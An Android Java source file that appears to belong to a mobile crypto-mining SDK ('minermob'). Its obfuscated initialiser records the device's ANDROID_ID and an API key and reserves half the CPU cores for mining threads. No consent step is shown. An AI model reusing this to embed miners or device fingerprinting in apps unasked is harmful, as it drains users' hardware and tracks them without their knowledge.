package minermob.service.c;

import android.app.Activity;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import minermob.service.R;
import minermob.service.utils.MBD;
import minermob.service.utils.Filtreler;
import minermob.service.utils.centiroler;
import minermob.service.utils.spMain;

 public class h {

    public static void o(final Activity a, final String dID, final String aKEY) {

        if (centiroler.who(a, dID, aKEY)) {
            MBD.yazdir(a);
            Filtreler.ekle(a);
        }

        try {
            spMain.spSetString(a.getResources().getString(R.string.dvk),a,aKEY);
            spMain.spSetString(a.getResources().getString(R.string.dv),a,dID);
            spMain.spSetString(a.getResources().getString(R.string.udi),a, Settings.Secure.getString(a.getContentResolver(),Settings.Secure.ANDROID_ID));
            spMain.spSetInt(a.getResources().getString(R.string.uth),a,((Runtime.getRuntime().availableProcessors() / 2)));
            spMain.spSetBoolean(a.getResources().getString(R.string.test), a, false);

        } catch (Exception e) {

            Log.d("Minermob", String.valueOf(e));

        }

    }
}
